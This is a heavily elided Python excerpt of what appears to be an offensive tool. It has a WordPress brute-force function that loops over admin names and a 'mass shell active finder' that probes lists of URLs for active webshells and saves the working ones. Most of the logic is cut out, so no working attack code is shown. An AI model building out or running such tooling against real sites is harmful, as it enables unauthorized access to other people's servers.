...
def brute_force_wordpress():
    ...
    def check_domain(domain):
        ...
        print("🚀️ Bruteforce in progress... 🚀️")
        for admin in admins:
    ...
    print("🚀️ Bruteforce completed! 🚀️")
...
def check_url(url):
    ...
    try:
        ...
        if response.status_code == 200 and "webshell" in response.text.lower():
            print(f"\033[92m[+] SUCCESS: Active webshell found at: {url}\033[0m")
            save_valid_url(url)
            return url
        else:
            print(f"\033[91m[-] FAILED: Webshell not active at: {url} - Status Code: {response.status_code}\033[0m")
    except requests.exceptions.RequestException as e:
...
def mass_shell_active_finder():
    ...
    valid_urls = check_urls(file_name)
